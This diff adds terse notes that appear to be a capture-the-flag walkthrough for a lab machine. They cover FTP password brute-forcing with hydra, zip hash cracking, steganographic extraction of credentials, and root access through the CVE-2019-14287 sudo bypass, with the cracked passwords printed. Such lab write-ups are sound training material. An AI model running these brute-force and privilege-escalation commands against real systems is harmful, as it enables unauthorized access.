@@ -1,0 +1,48 @@
+curl -A "C" -L 10.10.134.119
+
+username: chris
+
+hydra -l chris -P /usr/share/wordlists/rockyou.txt.gz 10.10.134.119 ftp -t 4  
+
+[21][ftp] host: 10.10.134.119   login: chris   password: crystal
+
+
+ftp 10.10.134.119
+
+ls
+mget *
+
+bikwalk cutie.png
+found zip file in image
+
+binwalk -e cutie.png
+
+zip2john 8702.zip > zip.hash
+
+john zip.hash
+password: alien
+
+7z e 8702.zip
+
+cat To_agentR.txt
+
+CyberChef     QXJlYTUx --base64--> Area51
+
+steghide info cute-alien.jpg
+passwd: Area51
+
+steghide extract -sf cute-alien.jpg
+passwd: hackerrules!
+user: james
+
+scp james@10.10.134.119:Alien_autospy.jpg ./
+
+ls
+sudo -l
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287
+
+sudo -u \#$((0xffffffff)) /bin/bash
+
